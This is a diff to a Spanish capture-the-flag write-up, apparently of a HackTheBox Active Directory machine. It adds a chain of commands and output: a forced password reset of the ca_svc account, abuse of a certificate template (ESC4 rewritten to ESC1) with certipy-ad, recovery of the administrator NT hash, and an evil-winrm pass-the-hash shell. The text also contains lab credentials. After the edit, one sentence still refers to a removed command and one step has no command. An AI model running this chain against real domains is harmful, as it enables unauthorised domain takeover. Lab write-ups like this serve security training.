@@ -671,48 +671,219 @@ Lo mas interesante es que el usuario ryan tiene el permiso WriteOwner sobre el u
 
 Como primer paso para su explotación otorge la propiedad:
 
-```bash
-impacket-owneredit -action write -new-owner 'ryan' -target-dn 'CN=ca_svc,CN=Users,DC=sequel,DC=htb'
-sequel.htb/ryan:'WqSZAF6CysDQbGb3'  -dc-ip 10.10.11.51
-
-/usr/share/doc/python3-impacket/examples/owneredit.py:87: SyntaxWarning: invalid escape sequence '\V'
-  'S-1-5-83-0': 'NT VIRTUAL MACHINE\Virtual Machines',
-/usr/share/doc/python3-impacket/examples/owneredit.py:96: SyntaxWarning: invalid escape sequence '\P'
-  'S-1-5-32-554': 'BUILTIN\Pre-Windows 2000 Compatible Access',
-/usr/share/doc/python3-impacket/examples/owneredit.py:97: SyntaxWarning: invalid escape sequence '\R'
-  'S-1-5-32-555': 'BUILTIN\Remote Desktop Users',
-/usr/share/doc/python3-impacket/examples/owneredit.py:98: SyntaxWarning: invalid escape sequence '\I'
-  'S-1-5-32-557': 'BUILTIN\Incoming Forest Trust Builders',
-/usr/share/doc/python3-impacket/examples/owneredit.py:100: SyntaxWarning: invalid escape sequence '\P'
-  'S-1-5-32-558': 'BUILTIN\Performance Monitor Users',
-/usr/share/doc/python3-impacket/examples/owneredit.py:101: SyntaxWarning: invalid escape sequence '\P'
-  'S-1-5-32-559': 'BUILTIN\Performance Log Users',
-/usr/share/doc/python3-impacket/examples/owneredit.py:102: SyntaxWarning: invalid escape sequence '\W'
-  'S-1-5-32-560': 'BUILTIN\Windows Authorization Access Group',
-/usr/share/doc/python3-impacket/examples/owneredit.py:103: SyntaxWarning: invalid escape sequence '\T'
-  'S-1-5-32-561': 'BUILTIN\Terminal Server License Servers',
-/usr/share/doc/python3-impacket/examples/owneredit.py:104: SyntaxWarning: invalid escape sequence '\D'
-  'S-1-5-32-562': 'BUILTIN\Distributed COM Users',
-/usr/share/doc/python3-impacket/examples/owneredit.py:105: SyntaxWarning: invalid escape sequence '\C'
-  'S-1-5-32-569': 'BUILTIN\Cryptographic Operators',
-/usr/share/doc/python3-impacket/examples/owneredit.py:106: SyntaxWarning: invalid escape sequence '\E'
-  'S-1-5-32-573': 'BUILTIN\Event Log Readers',
-/usr/share/doc/python3-impacket/examples/owneredit.py:107: SyntaxWarning: invalid escape sequence '\C'
-  'S-1-5-32-574': 'BUILTIN\Certificate Service DCOM Access',
-/usr/share/doc/python3-impacket/examples/owneredit.py:108: SyntaxWarning: invalid escape sequence '\R'
-  'S-1-5-32-575': 'BUILTIN\RDS Remote Access Servers',
-/usr/share/doc/python3-impacket/examples/owneredit.py:109: SyntaxWarning: invalid escape sequence '\R'
-  'S-1-5-32-576': 'BUILTIN\RDS Endpoint Servers',
-/usr/share/doc/python3-impacket/examples/owneredit.py:110: SyntaxWarning: invalid escape sequence '\R'
-  'S-1-5-32-577': 'BUILTIN\RDS Management Servers',
-/usr/share/doc/python3-impacket/examples/owneredit.py:111: SyntaxWarning: invalid escape sequence '\H'
-  'S-1-5-32-578': 'BUILTIN\Hyper-V Administrators',
-/usr/share/doc/python3-impacket/examples/owneredit.py:112: SyntaxWarning: invalid escape sequence '\A'
-  'S-1-5-32-579': 'BUILTIN\Access Control Assistance Operators',
-/usr/share/doc/python3-impacket/examples/owneredit.py:113: SyntaxWarning: invalid escape sequence '\R'
-  'S-1-5-32-580': 'BUILTIN\Remote Management Users',
-Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
-
-[-] Target principal not found in LDAP (CN=ca_svc,CN=Users,DC=sequel,DC=htb)
-```
 Mi comando anterior obtuvo un error indicando que no podía encontrar a **ca_svc** en LDAP así que enumeré los usuarios con ldapsearch para saber el Distinguished Name (DN) correcto
+
+Por ultimo cambie la contraseña del usuario `ca_svc`
+
+```bash
+┌──(root㉿kali)-[/opt/chuleta]
+└─# net rpc password ca_svc 'WqSZAF6CysDQbGb' -U sequel.htb/ryan%'WqSZAF6CysDQbGb3' -S 10.10.11.51
+```
+
+```bash
+──(root㉿kali)-[/opt/chuleta]
+└─# nxc smb 10.10.11.51 -u 'ca_svc' -p 'WqSZAF6CysDQbGb'                                     
+SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)                                                                                                                                     
+SMB         10.10.11.51     445    DC01             [+] sequel.htb\ca_svc:WqSZAF6CysDQbGb 
+```
+## ESC4
+
+Ahora que cambie la contraseña del usuario `ca_svc` realice una enumeración con certipy-ad y pude identificar que una plantilla es vulnerable a ESC4
+
+```bash
+┌──(root㉿kali)-[/opt/Certipy]
+└─# certipy-ad find -u 'ca_svc@sequel.htb' -p 'WqSZAF6CysDQbGb' -dc-ip 10.10.11.51 -enabled -text
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 15 issuance policies
+[*] Found 0 OIDs linked to templates
+[*] Retrieving CA configuration for 'sequel-DC01-CA' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Successfully retrieved CA configuration for 'sequel-DC01-CA'
+[*] Checking web enrollment for CA 'sequel-DC01-CA' @ 'DC01.sequel.htb'
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[*] Saving text output to '20250704182142_Certipy.txt'
+[*] Wrote text output to '20250704182142_Certipy.txt'
+```
+
+Al consultar el archivo se puede encontrar una plantilla vulnerable
+
+```bash
+ Template Name                       : DunderMifflinAuthentication
+    Display Name                        : Dunder Mifflin Authentication
+    Certificate Authorities             : sequel-DC01-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : False
+    Certificate Name Flag               : SubjectAltRequireDns
+                                          SubjectRequireCommonName
+    Enrollment Flag                     : PublishToDs
+                                          AutoEnrollment
+    Extended Key Usage                  : Client Authentication
+                                          Server Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 2
+    Validity Period                     : 1000 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Created                    : 2025-07-04T22:19:27+00:00
+    Template Last Modified              : 2025-07-04T22:19:27+00:00
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+      Object Control Permissions
+        Owner                           : SEQUEL.HTB\Enterprise Admins
+        Full Control Principals         : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+                                          SEQUEL.HTB\Cert Publishers
+        Write Owner Principals          : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+                                          SEQUEL.HTB\Cert Publishers
+        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+                                          SEQUEL.HTB\Cert Publishers
+        Write Property Enroll           : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+    [+] User Enrollable Principals      : SEQUEL.HTB\Cert Publishers
+    [+] User ACL Principals             : SEQUEL.HTB\Cert Publishers
+    [!] Vulnerabilities
+      ESC4                              : User has dangerous permissions.
+```
+
+La identificación anterior muestra que la plantilla `DunderMifflinAuthentication` es vulnerable a ESC4.
+## Explotación
+
+1. `Guardar la plantilla:` Antes de modificarla guardare la plantilla como buena practica para revertir los cambios una vez finalizado el ataque. 
+
+```bash
+┌──(root㉿kali)-[/opt/Certipy]
+└─# certipy-ad template -u 'ca_svc@sequel.htb' -p 'WqSZAF6CysDQbGb' -template DunderMifflinAuthentication -dc-ip 10.10.11.51 -save-configuration DunderMifflinAuthentication-original
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Saving current configuration to 'DunderMifflinAuthentication-original.json'
+File 'DunderMifflinAuthentication-original.json' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
+[*] Wrote current configuration for 'DunderMifflinAuthentication' to 'DunderMifflinAuthentication-original.json'
+```
+
+2. `Modificar la plantilla:` 
+Lo siguiente es modificar la plantilla para que pueda explotarse y escalar privilegios, uno de los cambios mas sencillos es hacerla vulnerable a ESC1, lo que permite suplantar la identidad de otro usuario.
+
+
+```bash
+┌──(root㉿kali)-[/opt/Certipy]
+└─# certipy-ad template -u 'ca_svc@sequel.htb' -p 'WqSZAF6CysDQbGb' -template DunderMifflinAuthentication -dc-ip 10.10.11.51 -write-default-configuration
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Saving current configuration to 'DunderMifflinAuthentication.json'
+File 'DunderMifflinAuthentication.json' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
+[*] Wrote current configuration for 'DunderMifflinAuthentication' to 'DunderMifflinAuthentication.json'
+[*] Updating certificate template 'DunderMifflinAuthentication'
+[*] Replacing:
+[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'
+[*]     flags: 66104
+[*]     pKIDefaultKeySpec: 2
+[*]     pKIKeyUsage: b'\x86\x00'
+[*]     pKIMaxIssuingDepth: -1
+[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']
+[*]     pKIExpirationPeriod: b'\x00@9\x87.\xe1\xfe\xff'
+[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']
+[*]     pKIDefaultCSPs: ['2,Microsoft Base Cryptographic Provider v1.0', '1,Microsoft Enhanced Cryptographic Provider v1.0']
+[*]     msPKI-Enrollment-Flag: 0
+[*]     msPKI-Private-Key-Flag: 16
+[*]     msPKI-Certificate-Name-Flag: 1
+[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
+Are you sure you want to apply these changes to 'DunderMifflinAuthentication'? (y/N): y
+[*] Successfully updated 'DunderMifflinAuthentication'
+```
+
+Validación con certipy-ad 
+
+```bash
+Template Name                       : DunderMifflinAuthentication
+    Display Name                        : Dunder Mifflin Authentication
+    Certificate Authorities             : sequel-DC01-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Private Key Flag                    : ExportableKey
+    Extended Key Usage                  : Client Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 2
+    Validity Period                     : 1 year
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Created                    : 2025-07-05T06:29:27+00:00
+    Template Last Modified              : 2025-07-05T06:31:00+00:00
+    Permissions
+      Object Control Permissions
+        Owner                           : SEQUEL.HTB\Enterprise Admins
+        Full Control Principals         : SEQUEL.HTB\Authenticated Users
+        Write Owner Principals          : SEQUEL.HTB\Authenticated Users
+        Write Dacl Principals           : SEQUEL.HTB\Authenticated Users
+    [+] User Enrollable Principals      : SEQUEL.HTB\Authenticated Users
+    [+] User ACL Principals             : SEQUEL.HTB\Authenticated Users
+    [!] Vulnerabilities
+      ESC1                              : Enrollee supplies subject and template allows client authentication.
+      ESC4                              : User has dangerous permissions.
+```
+
+3. Solicitar certificado para suplantar a un usuario
+Se debe especificar la autoridad certificadora que tiene la plantilla vulnerable, esta se encuentra en el archivo generado por certipy en **CA NAME**
+
+```bash
+CA Name                             : sequel-DC01-CA
+```
+
+4. Obtener el hash del usuario suplantado
+
+```bash
+──(root㉿kali)-[/opt/Certipy]
+└─# certipy-ad auth -pfx administrator.pfx -domain sequel.htb -dc-ip 10.10.11.51
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'administrator@sequel.htb'
+[*] Using principal: 'administrator@sequel.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+File 'administrator.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
+[*] Wrote credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
+```
+
+```bash
+┌──(root㉿kali)-[/home/kali/Downloads]
+└─# evil-winrm -i 10.10.11.51 -u Administrator -H '7a8d4e04986afa8ed4060f75e5a0b3ff'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+sequel\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Documents> 
+```
